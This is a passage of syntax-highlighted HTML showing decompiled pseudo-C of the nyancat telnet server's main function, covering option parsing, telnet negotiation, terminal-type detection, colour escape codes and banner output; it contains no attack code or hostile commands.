<span class="comment">// [rsp+473h] [rbp-4Dh]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+474h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v24; <span class="comment">// [rsp+478h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+484h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+488h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [rsp+48Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+490h] [rbp-30h]</span></span><br><span class="line">  <span class="type">bool</span> v29; <span class="comment">// [rsp+491h] [rbp-2Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v30; <span class="comment">// [rsp+492h] [rbp-2Eh]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+494h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [rsp+498h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+49Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [rsp+4A0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+4A4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *haystack; <span class="comment">// [rsp+4A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  haystack = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">90</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = getopt_long(a1, a2, <span class="string">&quot;eshiItnd:f:r:R:c:C:W:H:&quot;</span>, &amp;longopts, &amp;longind);</span><br><span class="line">    <span class="keyword">if</span> ( v26 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v26 &amp;&amp; !*((_QWORD *)&amp;longopts.flag + <span class="number">4</span> * longind) )</span><br><span class="line">      v26 = *(&amp;longopts.val + <span class="number">8</span> * longind);</span><br><span class="line">    <span class="keyword">switch</span> ( v26 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        dword_E1F8 = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">        dword_E1EC = (<span class="number">64</span> - atoi(optarg)) / <span class="number">2</span>;</span><br><span class="line">        dword_E1F0 = (atoi(optarg) + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">        dword_E1F0 = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">        dword_E1F4 = (<span class="number">64</span> - atoi(optarg)) / <span class="number">2</span>;</span><br><span class="line">        dword_E1F8 = (atoi(optarg) + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">        dword_E1F4 = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( atoi(optarg) &gt; <span class="number">9</span> &amp;&amp; atoi(optarg) &lt;= <span class="number">1000</span> )</span><br><span class="line">          v27 = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">        dword_E104 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">        dword_104C4 = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        sub_67F0(a2);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">        v29 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">        dword_E1EC = atoi(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        dword_E108 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">        dword_104C0 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_104C0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = v28 == <span class="number">0</span>;</span><br><span class="line">    sub_6669();</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;unk_104E0 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_66AF(*((<span class="type">unsigned</span> __int8 *)&amp;unk_104E0 + i), i);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;unk_105E0 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_66AF(*((<span class="type">unsigned</span> __int8 *)&amp;unk_105E0 + i), i);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    signal(<span class="number">14</span>, sub_64C0);</span><br><span class="line">    <span class="keyword">if</span> ( !_setjmp(env) )</span><br><span class="line">    &#123;</span><br><span class="line">      alarm(<span class="number">1u</span>);</span><br><span class="line">      <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) &amp;&amp; v32 &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = getchar();</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v16 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = getchar();</span><br><span class="line">          <span class="keyword">switch</span> ( v16 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-16</span>:</span><br><span class="line">              v31 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( LOBYTE(s[<span class="number">0</span>]) == <span class="number">24</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                alarm(<span class="number">2u</span>);</span><br><span class="line">                haystack = strndup((<span class="type">const</span> <span class="type">char</span> *)s + <span class="number">2</span>, <span class="number">0x3FEu</span>);</span><br><span class="line">                ++v32;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> ( LOBYTE(s[<span class="number">0</span>]) == <span class="number">31</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                alarm(<span class="number">2u</span>);</span><br><span class="line">                dword_E1FC = (BYTE1(s[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) | BYTE2(s[<span class="number">0</span>]);</span><br><span class="line">                dword_E200 = (BYTE3(s[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) | BYTE4(s[<span class="number">0</span>]);</span><br><span class="line">                ++v32;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-15</span>:</span><br><span class="line">              sub_66AF(<span class="number">241</span>, <span class="number">0</span>);</span><br><span class="line">              fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">              v31 = <span class="number">1</span>;</span><br><span class="line">              v30 = <span class="number">0</span>;</span><br><span class="line">              <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400u</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">              v15 = getchar();</span><br><span class="line">              <span class="keyword">if</span> ( !*((_BYTE *)&amp;unk_105E0 + v15) )</span><br><span class="line">                *((_BYTE *)&amp;unk_105E0 + v15) = <span class="number">-4</span>;</span><br><span class="line">              sub_66AF(*((<span class="type">unsigned</span> __int8 *)&amp;unk_105E0 + v15), v15);</span><br><span class="line">              fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v16 == <span class="number">-5</span> &amp;&amp; v15 == <span class="number">24</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c%c%c&quot;</span>, <span class="number">255</span>, <span class="number">250</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">240</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">              v15 = getchar();</span><br><span class="line">              <span class="keyword">if</span> ( !*((_BYTE *)&amp;unk_104E0 + v15) )</span><br><span class="line">                *((_BYTE *)&amp;unk_104E0 + v15) = <span class="number">-2</span>;</span><br><span class="line">              sub_66AF(*((<span class="type">unsigned</span> __int8 *)&amp;unk_104E0 + v15), v15);</span><br><span class="line">              fflush(<span class="built_in">stdout</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">              v32 = <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v31 &amp;&amp; v30 &lt;= <span class="number">0x3FEu</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)s + v30++) = v16;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    alarm(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    haystack = getenv(<span class="string">&quot;TERM&quot;</span>);</span><br><span class="line">    ioctl(<span class="number">0</span>, <span class="number">0x5413u</span>, v5);</span><br><span class="line">    dword_E1FC = v5[<span class="number">1</span>];</span><br><span class="line">    dword_E200 = v5[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v34 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = j;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(haystack) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      haystack[j] = <span class="built_in">tolower</span>(haystack[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;xterm&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;toaru&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;linux&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vtnt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;cygwin&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vt220&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;fallback&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;rxvt-256color&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;rxvt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;vt100&quot;</span>) &amp;&amp; dword_E1FC == <span class="number">40</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(haystack, <span class="string">&quot;st&quot;</span>, <span class="number">2u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  signal(<span class="number">2</span>, sub_64A8);</span><br><span class="line">  signal(<span class="number">13</span>, sub_64E6);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_104C0 )</span><br><span class="line">    signal(<span class="number">28</span>, handler);</span><br><span class="line">  <span class="keyword">switch</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[48;5;17m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[48;5;231m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[48;5;16m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[48;5;230m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[48;5;175m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[48;5;162m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[48;5;196m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[48;5;214m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[48;5;226m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[48;5;118m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[48;5;33m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[48;5;19m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[48;5;240m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[48;5;175m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[104m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[107m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[105m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[101m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[101m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[103m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[102m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[104m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[100m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[105m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[25;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[5;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[25;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[5;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[5;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[5;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[5;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[25;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[5;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[5;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[25;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[5;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[5;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[5;45m&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[0;30;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[0;33;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[1;33;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[1;32;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[1;34;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[1;30;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      off_FA88 = (<span class="type">char</span> *)&amp;unk_BCFF;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      qword_FE20 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE30 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;\x1B[0;30;40m&quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)<span class="string">&quot;\x1B[1;37;47m&quot;</span>;</span><br><span class="line">      qword_FDE0 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      qword_FE28 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FEB0 = (__int64)<span class="string">&quot;\x1B[1;31;41m&quot;</span>;</span><br><span class="line">      qword_FDF0 = (__int64)<span class="string">&quot;\x1B[0;33;43m&quot;</span>;</span><br><span class="line">      qword_FE18 = (__int64)<span class="string">&quot;\x1B[1;33;43m&quot;</span>;</span><br><span class="line">      qword_FDD8 = (__int64)<span class="string">&quot;\x1B[1;32;42m&quot;</span>;</span><br><span class="line">      qword_FEA8 = (__int64)<span class="string">&quot;\x1B[1;34;44m&quot;</span>;</span><br><span class="line">      qword_FE98 = (__int64)<span class="string">&quot;\x1B[0;34;44m&quot;</span>;</span><br><span class="line">      qword_FE10 = (__int64)<span class="string">&quot;\x1B[1;30;40m&quot;</span>;</span><br><span class="line">      qword_FDE8 = (__int64)<span class="string">&quot;\x1B[1;35;45m&quot;</span>;</span><br><span class="line">      off_FA88 = (<span class="type">char</span> *)&amp;unk_BD06;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      qword_FE20 = (__int64)&amp;unk_BD09;</span><br><span class="line">      qword_FE30 = (__int64)&amp;unk_BD0C;</span><br><span class="line">      qword_FDF8 = (__int64)<span class="string">&quot;  &quot;</span>;</span><br><span class="line">      qword_FEC0 = (__int64)&amp;unk_BD0F;</span><br><span class="line">      qword_FDE0 = (__int64)&amp;unk_BD12;</span><br><span class="line">      qword_FE28 = (__int64)&amp;unk_BD15;</span><br><span class="line">      qword_FEB0 = (__int64)&amp;unk_BD0F;</span><br><span class="line">      qword_FDF0 = (__int64)&amp;unk_BD18;</span><br><span class="line">      qword_FE18 = (__int64)&amp;unk_BD1B;</span><br><span class="line">      qword_FDD8 = (__int64)&amp;unk_BD1E;</span><br><span class="line">      qword_FEA8 = (__int64)&amp;unk_BD21;</span><br><span class="line">      qword_FE98 = (__int64)&amp;unk_BD24;</span><br><span class="line">      qword_FE10 = (__int64)&amp;unk_BD27;</span><br><span class="line">      qword_FDE8 = (__int64)&amp;unk_BD2A;</span><br><span class="line">      v25 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      qword_FE20 = (__int64)&amp;unk_BD2D;</span><br><span class="line">      qword_FE30 = (__int64)&amp;unk_BD2F;</span><br><span class="line">      qword_FDF8 = (__int64)&amp;unk_BD31;</span><br><span class="line">      qword_FEC0 = (__int64)&amp;unk_BD33;</span><br><span class="line">      qword_FDE0 = (__int64)&amp;unk_BD35;</span><br><span class="line">      qword_FE28 = (__int64)&amp;unk_BD37;</span><br><span class="line">      qword_FEB0 = (__int64)&amp;unk_BD33;</span><br><span class="line">      qword_FDF0 = (__int64)&amp;unk_BD39;</span><br><span class="line">      qword_FE18 = (__int64)&amp;unk_BD3B;</span><br><span class="line">      qword_FDD8 = (__int64)&amp;unk_BD3D;</span><br><span class="line">      qword_FEA8 = (__int64)&amp;unk_BD3F;</span><br><span class="line">      qword_FE98 = (__int64)&amp;unk_BD41;</span><br><span class="line">      qword_FE10 = (__int64)&amp;unk_BD43;</span><br><span class="line">      qword_FDE8 = (__int64)&amp;unk_BD45;</span><br><span class="line">      v25 = <span class="number">1</span>;</span><br><span class="line">      dword_E1FC = <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E1F4 == dword_E1F8 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_E1F4 = (dword_E1FC / <span class="number">-2</span> + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">    dword_E1F8 = (dword_E1FC / <span class="number">2</span> + <span class="number">64</span>) / <span class="number">2</span>;</span><br><span class="line">    byte_104CB = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E1EC == dword_E1F0 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_E1EC = (<span class="number">65</span> - dword_E200) / <span class="number">2</span>;</span><br><span class="line">    dword_E1F0 = (dword_E200 + <span class="number">63</span>) / <span class="number">2</span>;</span><br><span class="line">    byte_104CC = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E108 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1BkNyanyanyanyanyanyanya...\x1B\\&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B]1;Nyanyanyanyanyanyanya...\a&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B]2;Nyanyanyanyanyanyanya...\a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H\x1B[2J\x1B[?25l&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v29 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v14; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_65E2(<span class="number">3</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                             \x1B[1mNyancat Telnet Server\x1B[0m&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                   written and run by \x1B[1;32mK. Lange\x1B[1;34m @_klange\x1B[0m&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        If things don&#x27;t look right, try:&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">1</span>);</span><br><span class="line">      <span 